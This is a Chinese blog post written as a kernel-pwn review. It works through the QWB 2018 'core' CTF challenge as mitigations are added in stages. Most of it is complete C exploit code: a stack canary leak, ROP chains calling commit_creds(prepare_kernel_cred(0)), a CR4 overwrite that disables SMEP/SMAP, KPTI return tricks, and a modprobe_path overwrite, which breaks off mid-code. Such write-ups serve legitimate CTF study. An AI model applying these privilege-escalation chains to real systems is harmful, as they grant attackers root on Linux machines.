---
title: 「Kernel Pwn」简单复习一下 kernel pwn
description: 作者nova最近在复现一些kernel CVE，但发现自己对kernel的知识已经遗忘，因此决定利用三周时间进行复习。文章主要围绕kernel
  ROP（Return Oriented Programming）展开，逐步增强防护措施并探讨不同的绕过方法。
pubDate: 2024-07-12
tags:
- Pwn
- Kernel
authors:
- nova
lang: zh
---

最近在复现一些 kernel cve，但是发现 kernel 已经忘光光了。抓紧利用这三周进行复习。

<!--truncate-->

## 附件处理

写了几个小脚本

```bash title=extract_fs
#!/bin/bash

# 默认目标文件夹
folder="fs"

# 解析参数
while [[ "$#" -gt 0 ]]; do
  case $1 in
  -f | --folder)
    folder="$2"
    shift
    ;;
  *)
    cpio_path="$1"
    ;;
  esac
  shift
done

# 检查cpio_path是否提供
if [[ -z "$cpio_path" ]]; then
  echo "Usage: $0 [-f|--folder folder_name] cpio_path"
  exit 1
fi

# 创建目标文件夹
mkdir -p "$folder"

# 将cpio_path拷贝到目标文件夹
cp "$cpio_path" "$folder"

# 获取文件名
cpio_file=$(basename "$cpio_path")

# 进入目标文件夹
cd "$folder" || exit

# 判断文件是否被 gzip 压缩
if file "$cpio_file" | grep -q "gzip compressed"; then
  echo "$cpio_file is gzip compressed, checking extension..."

  # 判断文件名是否带有 .gz 后缀
  if [[ "$cpio_file" != *.gz ]]; then
    mv "$cpio_file" "$cpio_file.gz"
    cpio_file="$cpio_file.gz"
  fi

  echo "Decompressing $cpio_file..."
  gunzip "$cpio_file"
  # 去掉 .gz 后缀，得到解压后的文件名
  cpio_file="${cpio_file%.gz}"
fi

# 解压cpio文件
echo "Extracting $cpio_file to file system..."
cpio -idmv <"$cpio_file"
rm "$cpio_file"
echo "Extraction complete."
```

```bash title=compress_fs
#!/bin/sh

if [[ $# -ne 1 ]]; then
  echo "Usage: $0 cpio_path"
  exit 1
fi

cpio_file="../$1"

find . -print0 |
  cpio --null -ov --format=newc |
  gzip -9 >"$cpio_file"
```

```bash title=kcompile
#!/bin/sh

folder="fs"
cpio_file="initramfs.cpio.gz"
gcc_options=()

while [[ $# -gt 0 ]]; do
    case $1 in
        -f|--folder)
            folder="$2"
            shift
            ;;
        -c|--cpio)
            cpio_file="$2"
            shift
            ;;
        -*)
            gcc_options+=("$1")
            ;;
        *)
            src="$1"
            ;;
    esac
    shift
done

if [ -z "$src" ]; then
    echo "Usage: compile.sh [options] <source file>"
    echo "Options:"
    echo "  -f, --folder <folder>  Specify the folder to store the compiled binary"
    echo "  -c, --cpio <file>      Specify the cpio file name"
    echo "  <other options>        Options to pass to musl-gcc"
    exit 1
fi

out=$(basename "$src" .c)

echo -e "\033[35mCompiling $src to $folder/$out\033[0m"
musl-gcc -static "${gcc_options[@]}" "$src" -Os -s -o "$out" -masm=intel
strip "$out"
mv "$out" "$folder/"
cd "$folder"

echo -e "\033[35mCreating cpio archive $cpio_file...\033[0m"
find . -print0 | cpio --null -ov --format=newc | gzip -9 > "../${cpio_file}"
echo -e "\033[35mDone\033[0m"
```

## kernel rop

本节，我们将在强网杯 2018 core 的基础上，一步一步增强防护措施。

### 分析

由于漏洞分析非常简单，我们不再赘述，可以搜索关键词查看。

### Lv1. KCanary + KASLR

原本我想要把 KCanary 也关了的，但是需要重新编译内核太麻烦了。

于是 Lv1 是拥有 kcanary，其他均关闭的情况。

```bash title=start.sh
qemu-system-x86_64 \
  -m 128M \
  -kernel ./bzImage \
  -initrd ./initramfs.cpio.gz \
  -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet" \
  -s \
  -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
  -nographic

```

在这个情况下，我们仅需要读取 /tmp/kallsyms 拿到 commit_creds 和 prepare_kernel_cred 两个函数。



然而，其实因为能够直接获取地址，所以有没有 KASLR 没啥影响，因此我们把二者混在一起。



首先，我们需要找到 commit_creds 和 prepare_for_cred 两个函数的地址

```c title=exp
syms = fopen("/tmp/kallsyms", "r");
if (syms == NULL) {
    puts("\033[31m\033[1m[-] Open /tmp/kallsyms failed.\033[0m");
    exit(0);
}

while (fscanf(syms, "%lx %s %s", &addr, type, name)) {
    if (prepare_kernel_cred && commit_creds) {
        break;
    }

    if (!prepare_kernel_cred && strcmp(name, "prepare_kernel_cred") == 0) {
        prepare_kernel_cred = addr;
        printf("\033[33m\033[1m[√] Found prepare_kernel_cred: %lx\033[0m\n", prepare_kernel_cred);
    }

    if (!commit_creds && strcmp(name, "commit_creds") == 0) {
        commit_creds = addr;
        printf("\033[33m\033[1m[√] Found commit_creds: %lx\033[0m\n", commit_creds);
    }
}
```

然后，我们需要计算偏移。通过 `checksec` 之类的工具，我们可以看到 PIE 是 `0xffffffff81000000` 的，同样的我们也可以查到 commit_creds 在这个下面的地址。

```python
e = ELF('./vmlinux.unstripped')
hex(e.sym['commit_creds'])
```

因此，偏移这样计算：

```c title=exp
offset = commit_creds - 0x9c8e0 - 0xffffffff81000000;
```



此时，利用栈溢出，我们就可以修改返回地址

```c title=exp
// musl-gcc -static -masm=intel -Wno-error=int-conversion -o exp exp.c  // makes compiler happy
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>


#define POP_RDI_RET 0xffffffff81000b2f
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RCX_RET 0xffffffff81021e53
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define  IRETQ 0xffffffff81050ac2

#pragma clang diagnostic ignored "-Wconversion"  // makes me happy

size_t user_cs, user_ss, user_rflags, user_sp;
size_t prepare_kernel_cred, commit_creds;
void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void shell() {
    if (!getuid()) {
        system("/bin/sh");
    } else {
        puts("\033[31m\033[1m[-] Exploit failed.\033[0m");
        exit(0);
    }
}

void core_read(int fd, char* buf) {
    ioctl(fd, 0x6677889B, buf);
}

void core_set_offset(int fd, size_t offset) {
    ioctl(fd, 0x6677889C, offset);
}

void core_copy(int fd, size_t nbytes) {
    ioctl(fd, 0x6677889A, nbytes);
}

void getroot() {
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}


int main() {
    FILE *syms;
    int fd;
    size_t offset;

    size_t addr;
    size_t canary;
    char type[256], name[256];

    size_t rop[0x100], i;

    puts("\033[34m\033[1m[*] Start to exploit...\033[0m");
    save_status();

    fd = open("/proc/core", O_RDWR);
    if (fd < 0) {
        puts("\033[31m\033[1m[-] Open /proc/core failed.\033[0m");
        exit(0);
    }

    syms = fopen("/tmp/kallsyms", "r");
    if (syms == NULL) {
        puts("\033[31m\033[1m[-] Open /tmp/kallsyms failed.\033[0m");
        exit(0);
    }

    while (fscanf(syms, "%lx %s %s", &addr, type, name)) {
        if (prepare_kernel_cred && commit_creds) {
            break;
        }

        if (!prepare_kernel_cred && strcmp(name, "prepare_kernel_cred") == 0) {
            prepare_kernel_cred = addr;
            printf("\033[33m\033[1m[√] Found prepare_kernel_cred: %lx\033[0m\n", prepare_kernel_cred);
        }

        if (!commit_creds && strcmp(name, "commit_creds") == 0) {
            commit_creds = addr;
            printf("\033[33m\033[1m[√] Found commit_creds: %lx\033[0m\n", commit_creds);
        }
    }

    offset = commit_creds - 0x9c8e0 - 0xffffffff81000000;
    core_set_offset(fd, 64);
    core_read(fd, name);
    canary = ((size_t *)name)[0];
    printf("\033[34m\033[1m[*] offset: 0x%lx\033[0m\n", offset);
    printf("\033[33m\033[1m[√] Canary: %lx\033[0m\n", canary);

    for (i = 0; i < 10; i++) rop[i] = canary;
    rop[i++] = (size_t)getroot;
    rop[i++] = SWAPGS_POPFQ_RET + offset;
    rop[i++] = 0;
    rop[i++] = IRETQ + offset;
    rop[i++] = (size_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x100);
    core_copy(fd, 0xffffffffffff0000 | (0x100));
}
```



### Lv2. KCanary + KASLR + SMEP + SMAP

上面其实用的是 ret2usr 的手法，那么如果我们加上了 SMEP 和 SMAP 呢？



```bash title=start.sh
qemu-system-x86_64 \
  -m 128M \
  -kernel ./bzImage \
  # highlight-next-line
  -cpu qemu64-v1,+smep,+smap \ 
  -initrd ./initramfs.cpio.gz \
  -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet" \
  -s \
  -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
  -nographic
```

## 

#### method 0x1 - krop

其实最简单的，因为我们有一个溢出，直接在那写就行了。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>


#define POP_RDI_RET 0xffffffff81000b2f
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RCX_RET 0xffffffff81021e53
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define  IRETQ 0xffffffff81050ac2

size_t user_cs, user_ss, user_rflags, user_sp;
size_t prepare_kernel_cred, commit_creds;
void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void shell() {
    if (!getuid()) {
        system("/bin/sh");
    } else {
        puts("\033[31m\033[1m[-] Exploit failed.\033[0m");
        exit(0);
    }
}

void core_read(int fd, char* buf) {
    ioctl(fd, 0x6677889B, buf);
}

void core_set_offset(int fd, size_t offset) {
    ioctl(fd, 0x6677889C, offset);
}

void core_copy(int fd, size_t nbytes) {
    ioctl(fd, 0x6677889A, nbytes);
}


int main() {
    FILE *syms;
    int fd;
    size_t offset;

    size_t addr;
    size_t canary;
    char type[256], name[256];

    size_t rop[0x100], i;

    puts("\033[34m\033[1m[*] Start to exploit...\033[0m");
    save_status();

    fd = open("/proc/core", O_RDWR);
    if (fd < 0) {
        puts("\033[31m\033[1m[-] Open /proc/core failed.\033[0m");
        exit(0);
    }

    syms = fopen("/tmp/kallsyms", "r");
    if (syms == NULL) {
        puts("\033[31m\033[1m[-] Open /tmp/kallsyms failed.\033[0m");
        exit(0);
    }

    while (fscanf(syms, "%lx %s %s", &addr, type, name)) {
        if (prepare_kernel_cred && commit_creds) {
            break;
        }

        if (!prepare_kernel_cred && strcmp(name, "prepare_kernel_cred") == 0) {
            prepare_kernel_cred = addr;
            printf("\033[33m\033[1m[√] Found prepare_kernel_cred: %lx\033[0m\n", prepare_kernel_cred);
        }

        if (!commit_creds && strcmp(name, "commit_creds") == 0) {
            commit_creds = addr;
            printf("\033[33m\033[1m[√] Found commit_creds: %lx\033[0m\n", commit_creds);
        }
    }

    offset = commit_creds - 0x9c8e0 - 0xffffffff81000000;
    core_set_offset(fd, 64);
    core_read(fd, name);
    canary = ((size_t *)name)[0];
    printf("\033[34m\033[1m[*] offset: 0x%lx\033[0m\n", offset);
    printf("\033[33m\033[1m[√] Canary: %lx\033[0m\n", canary);

    for (i = 0; i < 10; i++) rop[i] = canary;
    rop[i++] = POP_RDI_RET + offset;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = POP_RDX_RET + offset;
    rop[i++] = POP_RCX_RET + offset;
    rop[i++] = MOV_RDI_RAX_CALL_RDX + offset;
    rop[i++] = commit_creds;
    rop[i++] = SWAPGS_POPFQ_RET + offset;
    rop[i++] = 0;
    rop[i++] = IRETQ + offset;
    rop[i++] = (size_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x100);
    core_copy(fd, 0xffffffffffff0000 | (0x100));

}
```

#### method 0x2  - disable smep/smap

上述的方法并不能严格算是 "绕过"。因此，我们继续来看 SMEP 和 SMAP 是怎么运行的。

![image.png](https://i.loli.net/2021/09/07/sYFKuZiUVNIclBp.png)

所以实际上它就是 CR4 寄存器的两个 bit 而已，我们置零即可。

ropper 找有没有能 pop cr4 的，没得，那就看看 mov cr4 的，找到一条

`0xffffffff81002515: mov cr4, rax; push rcx; popfq; ret;`

那我们就再重新布置一下 rop，把 cr4 改为 0x6f0 即可（图省事，你也可以用其他的 gadget 精准的去 xor 或者 not）

```c
for (i = 0; i < 10; i++) rop[i] = canary;
rop[i++] = POP_RAX_RET + offset;
rop[i++] = 0x6f0;
rop[i++] = MOV_CR4_RAX_PUSH_RCX_POPFQ_RET + offset;
rop[i++] = (size_t)getroot;
rop[i++] = SWAPGS_POPFQ_RET + offset;
rop[i++] = 0;
rop[i++] = IRETQ + offset;
rop[i++] = (size_t)shell;
rop[i++] = user_cs;
rop[i++] = user_rflags;
rop[i++] = user_sp;
rop[i++] = user_ss;
```



### Lv.3 KCanary + KASLR + SMEP + SMAP + KPTI

如果再上 KPTI，那前面的 method 0x2 就不能用了。但是 method 0x1 仍然可以用，因为 KPTI 只是做了隔离而已。然而，由于我们在内核态的时候，PGD 是内核的，所以换回来还需要再额外的做一些操作。

KPTI 简单来说，就是 4MB 的 PGD，0~4MB 放用户态 PGD，4~8MB 放内核态 PGD，通过 CR3 寄存器的 13 bit 的置反就可以非常高效的进行切换。

```bash title=start.sh
qemu-system-x86_64 \
  -m 128M \
  -cpu qemu64-v1,+smep,+smap \
  -kernel ./bzImage \
  -initrd  ./initramfs.cpio.gz \
  # highlight-next-line
  -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr pti=on" \
  -s  \
  -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
  -nographic  \
```



#### method 0x1 - swapgs_restore_regs_and_return_to_usermode

最简单的就是直接用 `swapgs_restore_regs_and_return_to_usermode` 里的正确的切换语句来操作了。这个函数里，与寄存器和栈有关的操作可以被简述为下文，因此我们中间添加两个 padding 即可

```assembly
mov  rdi, cr3
or rdi, 0x1000
mov  cr3, rdi
pop rax
pop rdi
swapgs
iretq
```



```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>


#define POP_RDI_RET 0xffffffff81000b2f
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RCX_RET 0xffffffff81021e53
#define POP_RAX_RET 0xffffffff810520cf
#define MOV_CR4_RAX_PUSH_RCX_POPFQ_RET 0xffffffff81002515
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define  IRETQ 0xffffffff81050ac2
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a008f0

#pragma clang diagnostic ignored "-Wconversion"  // makes me happy

size_t user_cs, user_ss, user_rflags, user_sp;
size_t prepare_kernel_cred, commit_creds;
void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void shell() {
    if (!getuid()) {
        system("/bin/sh");
    } else {
        puts("\033[31m\033[1m[-] Exploit failed.\033[0m");
        exit(0);
    }
}

void core_read(int fd, char* buf) {
    ioctl(fd, 0x6677889B, buf);
}

void core_set_offset(int fd, size_t offset) {
    ioctl(fd, 0x6677889C, offset);
}

void core_copy(int fd, size_t nbytes) {
    ioctl(fd, 0x6677889A, nbytes);
}

void getroot() {
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}


int main() {
    FILE *syms;
    int fd;
    size_t offset;

    size_t addr;
    size_t canary;
    char type[256], name[256];

    size_t rop[0x100], i;

    puts("\033[34m\033[1m[*] Start to exploit...\033[0m");
    save_status();

    fd = open("/proc/core", O_RDWR);
    if (fd < 0) {
        puts("\033[31m\033[1m[-] Open /proc/core failed.\033[0m");
        exit(0);
    }

    syms = fopen("/tmp/kallsyms", "r");
    if (syms == NULL) {
        puts("\033[31m\033[1m[-] Open /tmp/kallsyms failed.\033[0m");
        exit(0);
    }

    while (fscanf(syms, "%lx %s %s", &addr, type, name)) {
        if (prepare_kernel_cred && commit_creds) {
            break;
        }

        if (!prepare_kernel_cred && strcmp(name, "prepare_kernel_cred") == 0) {
            prepare_kernel_cred = addr;
            printf("\033[33m\033[1m[√] Found prepare_kernel_cred: %lx\033[0m\n", prepare_kernel_cred);
        }

        if (!commit_creds && strcmp(name, "commit_creds") == 0) {
            commit_creds = addr;
            printf("\033[33m\033[1m[√] Found commit_creds: %lx\033[0m\n", commit_creds);
        }
    }

    offset = commit_creds - 0x9c8e0 - 0xffffffff81000000;
    core_set_offset(fd, 64);
    core_read(fd, name);
    canary = ((size_t *)name)[0];
    printf("\033[34m\033[1m[*] offset: 0x%lx\033[0m\n", offset);
    printf("\033[33m\033[1m[√] Canary: %lx\033[0m\n", canary);

    for (i = 0; i < 10; i++) rop[i] = canary;
    rop[i++] = POP_RDI_RET + offset;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = POP_RDX_RET + offset;
    rop[i++] = POP_RCX_RET + offset;
    rop[i++] = MOV_RDI_RAX_CALL_RDX + offset;
    rop[i++] = commit_creds;
    rop[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + offset;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = (size_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x100);
    core_copy(fd, 0xffffffffffff0000 | (0x100));
}
```

#### method 0x2 - signal handling

如果我们不切换页表直接返回，可以看到它会报 SEGMENTATION FAULT 而不会 Panic，这就说明此时其实已经回到用户态了。那么我们直接用一个信号处理器就完事了。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>


#define POP_RDI_RET 0xffffffff81000b2f
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RCX_RET 0xffffffff81021e53
#define POP_RAX_RET 0xffffffff810520cf
#define MOV_CR4_RAX_PUSH_RCX_POPFQ_RET 0xffffffff81002515
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define  IRETQ 0xffffffff81050ac2

#pragma clang diagnostic ignored "-Wconversion"  // makes me happy

size_t user_cs, user_ss, user_rflags, user_sp;
size_t prepare_kernel_cred, commit_creds;
void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void shell() {
    if (!getuid()) {
        system("/bin/sh");
    } else {
        puts("\033[31m\033[1m[-] Exploit failed.\033[0m");
        exit(0);
    }
}

void core_read(int fd, char* buf) {
    ioctl(fd, 0x6677889B, buf);
}

void core_set_offset(int fd, size_t offset) {
    ioctl(fd, 0x6677889C, offset);
}

void core_copy(int fd, size_t nbytes) {
    ioctl(fd, 0x6677889A, nbytes);
}

void getroot() {
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}


int main() {
    FILE *syms;
    int fd;
    size_t offset;

    size_t addr;
    size_t canary;
    char type[256], name[256];

    size_t rop[0x100], i;

    puts("\033[34m\033[1m[*] Start to exploit...\033[0m");
    save_status();
    signal(SIGSEGV, shell);

    fd = open("/proc/core", O_RDWR);
    if (fd < 0) {
        puts("\033[31m\033[1m[-] Open /proc/core failed.\033[0m");
        exit(0);
    }

    syms = fopen("/tmp/kallsyms", "r");
    if (syms == NULL) {
        puts("\033[31m\033[1m[-] Open /tmp/kallsyms failed.\033[0m");
        exit(0);
    }

    while (fscanf(syms, "%lx %s %s", &addr, type, name)) {
        if (prepare_kernel_cred && commit_creds) {
            break;
        }

        if (!prepare_kernel_cred && strcmp(name, "prepare_kernel_cred") == 0) {
            prepare_kernel_cred = addr;
            printf("\033[33m\033[1m[√] Found prepare_kernel_cred: %lx\033[0m\n", prepare_kernel_cred);
        }

        if (!commit_creds && strcmp(name, "commit_creds") == 0) {
            commit_creds = addr;
            printf("\033[33m\033[1m[√] Found commit_creds: %lx\033[0m\n", commit_creds);
        }
    }

    offset = commit_creds - 0x9c8e0 - 0xffffffff81000000;
    core_set_offset(fd, 64);
    core_read(fd, name);
    canary = ((size_t *)name)[0];
    printf("\033[34m\033[1m[*] offset: 0x%lx\033[0m\n", offset);
    printf("\033[33m\033[1m[√] Canary: %lx\033[0m\n", canary);

    for (i = 0; i < 10; i++) rop[i] = canary;
    rop[i++] = POP_RDI_RET + offset;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = POP_RDX_RET + offset;
    rop[i++] = POP_RCX_RET + offset;
    rop[i++] = MOV_RDI_RAX_CALL_RDX + offset;
    rop[i++] = commit_creds;
    rop[i++] = SWAPGS_POPFQ_RET + offset;
    rop[i++] = 0;
    rop[i++] = IRETQ + offset;
    rop[i++] = (size_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x100);
    core_copy(fd, 0xffffffffffff0000 | (0x100));
}
```



### Lv.4 KCANARY + FGKASLR + SMEP + SMAP + KPTI

其实对于这个题，FGKASLR 没啥用，因为我们能知道所有符号的位置。而且编译的时候其实也没开（xiao

#### method 0x1 - .text gadgets

那么首先我们就用原来的方法做，只不过这次计算偏移要用 swapgs_restore_regs_and_return_to_usermod，因为 0xffffffff81000000~0xffffffff83000000 的都在一个 section 内，偏移是不变的，而我们的 gadgets 都在这个段

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>


#define POP_RDI_RET 0xffffffff81000b2f
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RCX_RET 0xffffffff81021e53
#define POP_RAX_RET 0xffffffff810520cf
#define MOV_CR4_RAX_PUSH_RCX_POPFQ_RET 0xffffffff81002515
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define  IRETQ 0xffffffff81050ac2

#pragma clang diagnostic ignored "-Wconversion"  // makes me happy

size_t user_cs, user_ss, user_rflags, user_sp;
size_t prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode;
void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void shell() {
    if (!getuid()) {
        system("/bin/sh");
    } else {
        puts("\033[31m\033[1m[-] Exploit failed.\033[0m");
        exit(0);
    }
}

void core_read(int fd, char* buf) {
    ioctl(fd, 0x6677889B, buf);
}

void core_set_offset(int fd, size_t offset) {
    ioctl(fd, 0x6677889C, offset);
}

void core_copy(int fd, size_t nbytes) {
    ioctl(fd, 0x6677889A, nbytes);
}

void getroot() {
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}


int main() {
    FILE *syms;
    int fd;
    size_t offset;

    size_t addr;
    size_t canary;
    char type[256], name[256];

    size_t rop[0x100], i;

    puts("\033[34m\033[1m[*] Start to exploit...\033[0m");
    save_status();
    signal(SIGSEGV, shell);

    fd = open("/proc/core", O_RDWR);
    if (fd < 0) {
        puts("\033[31m\033[1m[-] Open /proc/core failed.\033[0m");
        exit(0);
    }

    syms = fopen("/tmp/kallsyms", "r");
    if (syms == NULL) {
        puts("\033[31m\033[1m[-] Open /tmp/kallsyms failed.\033[0m");
        exit(0);
    }

    while (fscanf(syms, "%lx %s %s", &addr, type, name)) {
        if (prepare_kernel_cred && commit_creds && swapgs_restore_regs_and_return_to_usermode) {
            break;
        }

        if (!prepare_kernel_cred && strcmp(name, "prepare_kernel_cred") == 0) {
            prepare_kernel_cred = addr;
            printf("\033[33m\033[1m[√] Found prepare_kernel_cred: %lx\033[0m\n", prepare_kernel_cred);
        }

        if (!commit_creds && strcmp(name, "commit_creds") == 0) {
            commit_creds = addr;
            printf("\033[33m\033[1m[√] Found commit_creds: %lx\033[0m\n", commit_creds);
        }

        if (!swapgs_restore_regs_and_return_to_usermode && strcmp(name, "swapgs_restore_regs_and_return_to_usermode") == 0) {
            swapgs_restore_regs_and_return_to_usermode = addr;
            printf("\033[33m\033[1m[√] Found swapgs_restore_regs_and_return_to_usermode: %lx\033[0m\n", swapgs_restore_regs_and_return_to_usermode);
        }
    }

    offset = swapgs_restore_regs_and_return_to_usermode - 0xa008da - 0xffffffff81000000;
    core_set_offset(fd, 64);
    core_read(fd, name);
    canary = ((size_t *)name)[0];
    printf("\033[34m\033[1m[*] offset: 0x%lx\033[0m\n", offset);
    printf("\033[33m\033[1m[√] Canary: %lx\033[0m\n", canary);

    for (i = 0; i < 10; i++) rop[i] = canary;
    rop[i++] = POP_RDI_RET + offset;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = POP_RDX_RET + offset;
    rop[i++] = POP_RCX_RET + offset;
    rop[i++] = MOV_RDI_RAX_CALL_RDX + offset;
    rop[i++] = commit_creds;
    rop[i++] = SWAPGS_POPFQ_RET + offset;
    rop[i++] = 0;
    rop[i++] = IRETQ + offset;
    rop[i++] = (size_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x100);
    core_copy(fd, 0xffffffffffff0000 | (0x100));
}
```



#### method 0x2 - __ksymtab

接下来我们假设我们没有办法获取到 commit 和 prepare 两个函数所在段的地址。根据 FGKASLR 的实现，我们可以使用 `readelf --section-headers -W vmlinux | grep -vE 'ax'` 来看哪些段是不会进行额外偏移的。那么可以看到一个 `__ksymtab` 段，它保存了当前地址到 sym 的 offset，而它到内核基地址的偏移是固定的。

我们可以利用类似的 gadget 来做到

```assembly
push rax; ret;
__ksymtab_commit_creds - 0x10;
mov rax, [rax + 0x10];
push rdi; ret;
__ksymtab_commit_creds;
add rdi, rax;
; RDI is commit_creds now
```

然而，在这个题里，我发现 vmlinux 里存的不是 offset 而是直接的地址，一个 ksymtab 按理来说有 3 个 int 也只有两个，不知道是 ida 的问题还是什么。用 vmlinux-to-elf 恢复的 vmlinux.stripped 则没有这个符号，因此暂时搁置。



#### method 0x3 - modprobe_path

第三种打 modprobe_path，这是在内核里的一个变量，在 .data 段。当执行一个未知文件头的程序的时候，就会 `do_execve()` 一路判断，然后走到 `call_modprobe`，利用 modprobe_path 的文件去执行这个程序，此时用的是 root 权限。因此我们只需要覆盖 modprobe_path 就好。

首先拿到 modprobe_path 的地址，我这里没有找到符号表，但是可以直接搜内存 "/sbin/modprobe" 就可以找到了。返回用户态之后，我们就去创建一个恶意程序，~~例如可以生成一个 suid 位设置的 shell~~ 似乎这样的话 root 没有 PATH 环境变量，所以直接拷贝 flag 会好一些

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>


#define POP_RAX_RET 0xffffffff810520cf
#define MOV_PTR_RBX_RAX_POP_RBX_RET 0xffffffff8101e5e1
#define POP_RBX_RET 0xffffffff81000472
#define MODPROBE_PATH 0xffffffff8223d8c0
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a008f0

#pragma clang diagnostic ignored "-Wconversion"  // makes me happy

size_t user_cs, user_ss, user_rflags, user_sp;
size_t swapgs_restore_regs_and_return_to_usermode;
void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void core_read(int fd, char* buf) {
    ioctl(fd, 0x6677889B, buf);
}

void core_set_offset(int fd, size_t offset) {
    ioctl(fd, 0x6677889C, offset);
}

void core_copy(int fd, size_t nbytes) {
    ioctl(fd, 0x6677889A, nbytes);
}

void getFlag() {
    puts("\033[33m\033[01m[+] Ready to get flag!!!\033[0m");
    system("echo '#!/bin/sh\ncp /root/flag /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/nova");
    system("chmod +x /tmp/nova");

    puts("\033[33m\033[01m[+] Run /tmp/nova\033[0m");
    system("/tmp/nova");

    system("cat /tmp/flag");
    exit(0);
}


int main() {
    FILE *syms;
    int fd;
    size_t offset;

    size_t addr;
    size_t canary;
    char type[256], name[256];

    size_t rop[0x100], i;

    puts("\033[34m\033[1m[*] Start to exploit...\033[0m");
    save_status();

    fd = open("/proc/core", O_RDWR);
    if (fd < 0) {
        puts("\033[31m\033[1m[-] Open /proc/core failed.\033[0m");
        exit(0);
    }

